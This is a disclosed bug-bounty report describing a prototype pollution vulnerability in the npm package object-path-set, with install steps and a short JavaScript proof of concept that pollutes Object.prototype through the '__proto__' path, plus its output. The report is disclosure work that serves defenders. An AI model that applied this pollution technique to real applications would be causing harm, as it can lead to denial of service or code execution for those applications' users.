# [object-path-set] Prototype pollution

## Report Details
- **Report ID**: 878332
- **URL**: https://hackerone.com/reports/878332
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-05-19T19:17:47.109Z
- **Disclosed**: 2020-08-20T09:08:31.858Z

## Reporter
- **Username**: d3lla
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `prototype pollution` vulnerability in `object-path-set` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `object-path-set`
**version:** `1.0.0`
**npm page:** `https://www.npmjs.com/package/object-path-set`

## Module Description

set values in javascript objects by specifying a path.
if the path doesn't exist yet, it will be created.

## Module Stats

[81] weekly downloads

# Vulnerability

## Vulnerability Description

The `setPath` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `object-path-set` module:
    - `npm i object-path-set`

Set the `__proto__.polluted` property of an object:
```javascript

const setPath = require('object-path-set');
const obj = {};
console.log("Before : " + obj.polluted);
setPath({}, '__proto__.polluted', 'yes');
console.log("After : " + obj.polluted);
```
Output:
```console

Before : undefined
After : yes
```
{F835049}

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.

## Attachments
- object-path-set_poc.mov
